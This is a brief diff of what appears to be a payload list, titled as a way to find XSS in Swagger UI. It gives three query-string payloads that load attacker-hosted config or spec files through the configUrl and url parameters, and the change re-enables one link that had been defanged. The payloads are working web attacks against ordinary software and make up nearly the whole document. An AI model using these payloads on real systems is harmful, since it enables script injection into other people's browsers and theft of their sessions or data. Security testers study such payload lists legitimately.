@@ -112,4 +112,4 @@ find xss in swagger-ui with the following payloads
 
 ?configUrl=https://xss.smarpo.com/test.json&url=https://jumpy-floor.surge.sh/test.yaml
 ?configUrl=https://jumpy-floor.surge.sh/test.json
-?url=https://jumpy-floor.surge(.)sh/test.yaml
+?url=https://jumpy-floor.surge.sh/test.yaml
